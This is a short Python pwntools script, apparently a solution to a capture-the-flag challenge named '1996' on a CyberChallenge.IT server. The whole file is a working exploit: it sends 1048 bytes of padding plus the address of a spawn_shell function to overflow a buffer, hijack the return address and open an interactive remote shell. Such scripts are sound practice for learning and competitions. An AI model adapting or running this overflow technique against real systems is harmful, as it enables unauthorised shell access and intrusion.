from pwn import *

exe = ELF("./1996")
r = remote('1996.challs.cyberchallenge.it', 9121)

r.sendlineafter(b'to read', b'1' * 1048 + p64(exe.symbols['_Z11spawn_shellv']))
# print(r.recvall().decode())ls


r.clean()
r.interactive()
r.close()